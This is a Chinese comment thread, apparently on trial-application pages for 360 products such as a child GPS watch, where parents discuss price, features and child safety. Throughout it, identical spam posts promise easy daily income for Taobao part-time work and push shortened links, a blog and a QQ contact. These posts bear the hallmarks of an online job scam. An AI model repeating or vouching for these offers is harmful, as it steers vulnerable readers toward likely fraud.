利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O ～1 O O左右。（宝妈、学生、上班族都可以） 有意者请博客联系我 http://blog.sina.com.cn/s/blog_dd683eb30101dhg6.html  
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
能不能在防水方面再下一些功夫？
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
非常不错，目前我对此类产品非常热衷！期待》》》》》》
为了孩子的安全，望通过！
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O ～1 O O左右。（宝妈、学生、上班族都可以） 有意者请博客联系我 http://blog.sina.com.cn/s/blog_dd683eb30101dhg6.html  
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
潮流空间网店现招收大量免费的代理商，兼职全职均可。所得到的报酬与你的努力成正比，要求并不多只要代理商花点时间打理一下即可。有意者加q：807511979私聊，新手包教会。
潮流空间网店现招收大量免费的代理商，兼职全职均可。所得到的报酬与你的努力成正比，要求并不多只要代理商花点时间打理一下即可。有意者加q：807511979私聊，新手包教会。  
很好的构思,希望能尽快推出
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
很好！很想要请给我 
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O ～1 O O左右。（宝妈、学生、上班族都可以） 有意者请博客联系我 http://blog.sina.com.cn/s/blog_dd683eb30101dhg6.html  
谢谢了！真心啊 
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
免费的吗？
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O ～1 O O左右。（宝妈、学生、上班族都可以） 有意者请博客联系我 http://blog.sina.com.cn/s/blog_dd683eb30101dhg6.html  
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
这种手表给调皮小孩和老人用最好
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
希望成为幸运者，能送我一个试用
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O ～1 O O左右。（宝妈、学生、上班族都可以） 有意者请博客联系我 http://blog.sina.com.cn/s/blog_dd683eb30101dhg6.html  
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
小巧方便！大爱！
我喜欢买！
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O ～1 O O左右。（宝妈、学生、上班族都可以） 有意者请博客联系我 http://blog.sina.com.cn/s/blog_dd683eb30101dhg6.html  
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
永远相信美好的事情即将发生
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O ～1 O O左右。（宝妈、学生、上班族都可以） 有意者请博客联系我 http://blog.sina.com.cn/s/blog_dd683eb30101dhg6.html  
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O ～1 O O左右。（宝妈、学生、上班族都可以） 有意者请博客联系我 http://blog.sina.com.cn/s/blog_dd683eb30101dhg6.html  
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O ～1 O O左右。（宝妈、学生、上班族都可以） 有意者请博客联系我 http://blog.sina.com.cn/s/blog_dd683eb30101dhg6.html  
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
是啊，孩子的安全第一啊
已经申请试用了不知道能否幸运得到.也不知道在哪里能买到.给个提示就好了.
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
价格有点贵了，但是我现在关注的，在哪里可以购买到这个，设计很人性化，可以让我们更加的了解孩子的动向。
孩子已经开始上学了,但是在上下学的路上很不放心.想在六.一到来之际送他一个安全保证，自己在上班的时候也能知道孩子的位置。 
这个真不错
小米2S支持吗?
要多少钱，一桶衣服洗多久，要换水清理吗？
如果质量过关，实用性真的如介绍所说的话，绝对是好产品
认真看了宝贝的功能，实在是太强大了，让我们这些不能陪伴孩子入园、上学的家长能够时刻了解到孩子的情况，非常喜欢，六一带小妞儿去迪士尼，希望能给小妞儿戴上这个强大的手表。
这个真不错！理念很好，但价格太高
很有意思的创意，效率有多少呢？
居然这么神奇的东东，我看了好厉害的感觉
成功的锻炼。。。
招淘宝傔职人员，有意者请博客联系我【 http://t.cn/8sfyr3p】复制到地址栏打开。要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
good ideas
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
我需要买一个，什么时候开卖
所谓的专业试客 cindy 是也
有思考就有收获，支持一下！！！
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
如果试用好用，可向我的院长同学推荐下
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
要是真心想要的就去买一个。别装啦
我也觉得贵了
如果能把所想的形成画面，那明星都要下岗了！！
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
索性求试用，还不如自己动手来点实际的。。。给自己找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
这个非常的期待，是所有爱美女性的大爱，但愿早日问世
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
   智能手机很快即可以替代它，请找一个不被替代的理由 
要考虑的是还需要洗衣粉，洗衣液之类的吗？同上所述，效率和亲民价格也是考虑的因素
真心想要一个。
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
7岁8岁狗都嫌，这个时候的孩子好奇心最强，胆子也是最大的时候，尤其是男孩，脑子里装满了为什么，总想什么都要自己去试试去看看，做家长的心都操碎了，我相信这款产品是真正的好帮手，我期待我被抽中免费试用的那一天
说是使用，是不是还要付钱的
既然有年使用费，我想增加语音通话功能就更强大了 
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
增加语音通话，通信功能。简单1-3个号码，可呼入、呼出，这样更好。
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
我上班工作忙，经常忘记接孩子，如果这个好用、价格公道的话，我要六个。
这东西非常有用啊，期待赶紧出炉
孩子已经开始上学了,但是在上下学的路上很不放心.想在六.一到来之际送他一个安全保证，自己在上班的时候也能知道孩子的位置。  
看起来真是个好东西，如果真是那么好用，前途无量啊这个产品；我会向我的教育局系统的同学推荐给他们让整个徐州的孩子都安全起来，真棒！
如果价格和便宜的话，一定会有市场的。
不错，很喜欢。
真希望能有这个，网游小说里常常出现这个。。。
终于出来了，真好。。。。期待啊
儿童安全的确是个问题，也是一个市场，支持360朝这个方向发展，同时为了孩子的安全，也希望有幸试用，谢谢！
看到这么多的宝爸宝妈和我一样，真的是很揪心，中国的孩子啊，这么都那么早熟呢，都有一个人可以陪他们一起去上学多好，路上也安全多了
ahhhhhhhhhh！！！！    有萌妹子，果断怒赞一个啊！！！！！
孩子已经开始上学了,但是在上下学的路上很不放心.想在六.一到来之际送他一个安全保证，自己在上班的时候也能知道孩子的位置。  
良心产品，家长都应该给孩子被一个，一旦孩子被坏人拐走可能还有机会找回来，一万个赞！
这个产品很好，应该会很有市场！
提交了申请，希望能选中我吧！！神啊 赐予我幸运吧！我是宝妈！有了他，就不愁找不到到处跑的小屁孩了！
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
很喜欢，外观漂亮
想在6.1送给宝宝
孩子已经开始上学了,但是在上下学的路上很不放心.想在六.一到来之际送他一个安全保证，自己在上班的时候也能知道孩子的位置。
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
申请试用了 如果没被选中就只好等产品出来后买了
很不错的产品，虽然我的手机只支持单击，不过够用了 ，支持！
这个只有手表外形的吗？如果有其他形状的，或者更小巧、易于隐藏的市场会更大。
我家的儿子总想自己挣脱父母的管束，但他还只有8岁啊，我们都不放心。这款产品很期待
360真会选择大众的眼球，挺你！！
宝贝一直想要个手表看来这个是最好的选择呢
真心的想要一个，试用可以的话，就介绍给朋友，同学，学校，让老师和家长们可以省心很多，真心的期待！
测试测试测试
一直很少在网上发表言论，不过这一次很期待自己够幸运，会一直关注的
这是一份爱的礼物！谢谢360卫士！
对于家长来说，这款产品太有用。值得购买。
我希望拥有！对小孩太有用了！
大爱！期待！
产品符合家长对儿童安全担心的一种保障，只要价格合适，应该很有市场。
早就应该出了，社会这么复杂！孩子就是我们的一切
已经买了啦，真心的好用，已经向身边的朋友推荐了！
期待、期盼。
加上通话功能就更好了
期待使用.... 
很有市场的成品！
支持下，希望免费给试用
有时间的亲们，给自己找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～ 
这个产品如要能够开发成学校/幼儿园与家长互动的功能，可能会更好的推广在学校/幼儿园使用，比如签到功能、通知家长会等等吧，这样可能需要开发更长时间咯~~~
如果真的好的话，就可以减少父母的担心了
要是能有净化功能就更好了！
这个产品强烈要求给试用，太合我意了，就是不知道什么时候出来
什么时候上市
有时间的亲们，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～  
有机会试用后，真得很好，我一定要推荐给身边的朋友
期待！等待！请给一个机会吧~
有点儿小贵哟.产口,是不是,果蔬都 能种呢?不需要阳光照射吗?
加上通话功能就更好了 ，才能更准确的知道孩子在哪，在干什么
如果能通话或信息，就更好了
如果能推广，将大大减少环境污染，也有很多洗涤公司倒闭哟 
真希望拥有，太实用了。原来就想从国外带回来用的，现在好了。
我家两臭小子总是到处跑得不见踪影，这个产品的出现真的是让人眼前一亮。可以让我们做家长的省心不少呢！感谢360能出这么好这么贴心的产品，一定会在身边多多宣传的，谢谢了！
好期待，希望拥有
哈哈.减肥当然也要 用数字来说话哈哈.顶一个..几多银纸呢?
关怀的产品,价格也最好人性化些咯.这样受众人群就更多啦..
期待啊 一定要快出啊
真希望拥有～～～有机会试用后，我一定要推荐给身边的朋友
好东东,外观可以更多样些咯.比如 前面加个篮筐  ,或者后面可以有座椅哟...新奇特,其实算不上哈哈..最主要是 看电池能用多久啦
不是说抢购持续了3分钟么
妈妈们再也不用担心找不到宝贝了
这个不错感觉很实用 希望能添加无线说话就好了 这样能方便更实用   市场也会好的
这个真不错，对于我这样的丢三落四的人群，非常非常适合。期待中。
不用的，我中过一期。直接拿到产品就成，写一份报告就成了
太帅了，真心不错，多买几个 
期待中。。。。。。
小姐小姐小姐小姐小姐
现在的孩子很需要这样的，也为孩子的安全考虑，希望能有试用的机会。
可以用灯光代替
感觉有点贵 现在4G也不普及      
太棒了，加油呀，期待
哈哈.不错哈.
淘宝傔职淘宝傔职淘宝傔职淘宝傔职
用空余的时间做份网络工作吧。家庭主妇,在校学生,办公室人员咨询。每天也能80-150块。根据自己的时间自由安排。不影响生活工作。多作多结算。有意者请看客服博客报名 http://955.cc/3bEU 【复制到地址栏打开】 
太好了，终于有了理想中的产品，定位手表能视频对话更好，科技使生活更美丽，孩子更安全。
好期待哦。。。。。。
这是个好产品
我也申请了一个，等待中
一直在找这种产品呢，什么时候开始发售啊？？？小宝宝贴额头的那种降温贴都习惯的用手去弄掉，不知道放腋窝里会不会也不舒服啊
要是能有通话功能和拍照功能就更好了，能准确定位到孩子在哪
有个同事申请到了免费试用，说是很好用，真的希望能有机会试用！
希望能马上上市，见到实物产品，加油期待中
每次孩子出去,因为老人年纪大了,总是不放心,而老人又不会用手机,急得不行,这个产品真心不错,值得购买.
如果好用，我会推荐给孩子们的家长
期待中，有了它就像打实战一样过瘾了
希望能快点见到这些创意产品上市,期待中
我想把它贴在我儿子的身上
能便宜些就好了，老百姓买得起的好产品一切为了孩子
有点科幻的赶脚，期待
用空余的时间做份网络工作吧。家庭主妇,在校学生,办公室人员咨询。每天也能80-150块。根据自己的时间自由安排。不影响生活工作。多作多结算。有意者请看客服博客报名 http://955.cc/3bEU 【复制到地址栏打开】
效果截图很不错。。。尤其是最右→_→
用空余的时间做份网络工作吧。家庭主妇,在校学生,办公室人员咨询。每天也能80-150块。根据自己的时间自由安排。不影响生活工作。多作多结算。有意者请看客服博客报名 http://955.cc/3bEU 【复制到地址栏打开】
一个字，帅
用空余的时间做份网络工作吧。家庭主妇,在校学生,办公室人员咨询。每天也能80-150块。根据自己的时间自由安排。不影响生活工作。多作多结算。有意者请看客服博客报名 http://955.cc/3bEU 【复制到地址栏打开】
强烈支持，这样又加了一道保障
用空余的时间做份网络工作吧。家庭主妇,在校学生,办公室人员咨询。每天也能80-150块。根据自己的时间自由安排。不影响生活工作。多作多结算。有意者请看客服博客报名 http://955.cc/3bEU 【复制到地址栏打开】
我也希望拥有这样的机会，真实很担心小宝贝
期待…………
什么时候开卖呀，360加油、加油呀
用空余的时间做份网络工作吧。家庭主妇,在校学生,办公室人员咨询。每天也能80-150块。根据自己的时间自由安排。不影响生活工作。多作多结算。有意者请看客服博客报名 http://955.cc/3bEU 【复制到地址栏打开】
每次孩子出去,因为老人年纪大了,总是不放心,而老人又不会用手机,急得不行,这个产品真心不错,值得购买. 
真心希望能拥有这么好的产品.定会好好推广
用空余的时间做份网络工作吧。家庭主妇,在校学生,办公室人员咨询。每天也能80-150块。根据自己的时间自由安排。不影响生活工作。多作多结算。有意者请看客服博客报名 http://955.cc/3bEU 【复制到地址栏打开】
可惜不向下支持安卓版本
用空余的时间做份网络工作吧。家庭主妇,在校学生,办公室人员咨询。每天也能80-150块。根据自己的时间自由安排。不影响生活工作。多作多结算。有意者请看客服博客报名 http://955.cc/3bEU 【复制到地址栏打开】
什么时候可以倒我手
希望能试用
能中一个吗？希望人品爆发下，这个真不错
这个好。但是价格要普及哦
能中一个吗？希望人品爆发下，这个真不错  
如果好用，我一定要推荐给更多孩子的家长好让他们也放心，可怜天下父母心啊！ 
坐等…………
没有当时IPHONE4接口，台湾出的那款好看
每天在外工作很晚，没法照顾小孩，希望得到一个卫士，随时知道宝宝在哪？可以的话，卖我一个也行啊
:D 恩！
